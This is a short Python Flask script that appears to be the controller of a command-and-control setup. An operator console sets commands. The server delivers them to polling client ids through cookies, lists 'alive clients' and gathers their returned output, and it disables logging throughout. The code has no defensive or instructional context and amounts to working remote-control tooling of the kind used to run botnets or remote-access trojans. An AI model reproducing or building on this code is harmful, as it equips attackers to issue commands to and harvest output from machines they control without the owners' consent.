from flask import Flask, render_template, make_response, request, session
from datetime import timedelta
import threading
import random
import logging
import time
from urllib.parse import quote, unquote

app = Flask(__name__)
app.logger.disabled = True 
logging.getLogger("werkzeug").disabled = True 

for_c = 'All'
ran = []
results = []
command = ""

def run_flask():
    app.run(host="127.0.0.1",port=5000,debug=False,use_reloader=False)

@app.route("/")
def send():
    client_id = request.args.get("id")
    output = request.args.get("output")
    if output != None:
        results.append(output)
    page = make_response(render_template("clientManager.html"))
    if client_id in ran:
        page.set_cookie('command', '')
    else:
        page.set_cookie('command', command)
        page.set_cookie('for', for_c)
        ran.append(client_id)
    return page

if __name__ == "__main__":
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    time.sleep(5)
    print('\n')

    while True:
        prompt = input('set command> ')
        if prompt == "list":
            print(f'Alive clients: {ran}')
        elif prompt == 'set':
            for_c = input('which client> ')
            ran.clear()
        elif prompt == 'results':
            for r in results:
                print(r)
        else:
            command = quote(prompt)
            print("command",command)
            print(f'[*]command: {prompt} set.\n')
            ran.clear()
        
